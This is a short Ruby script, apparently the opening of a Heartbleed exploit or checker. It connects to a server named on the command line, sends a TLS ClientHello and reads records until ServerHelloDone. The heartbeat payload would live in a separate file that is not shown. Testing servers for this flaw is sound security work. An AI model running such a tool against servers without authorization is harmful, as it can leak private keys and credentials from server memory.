#!/usr/bin/env ruby

require 'socket'
require 'timeout'

require_relative 'shared'

def read_until_server_hello_done(sock)
    loop do
        record = read_record(sock)
        break if record.value == SERVER_HELLO_DONE
    end
end

server = ARGV[0]
port = (ARGV[1] || 443).to_i
raise "Usage: ruby heartbleed.rb <server>" unless server

sock = begin
    Timeout.timeout(3) { TCPSocket.open(server, port) }
rescue Timeout::Error
    raise "Couldn't connect to #{server}:#{port}"
end

sock.write(CLIENT_HELLO)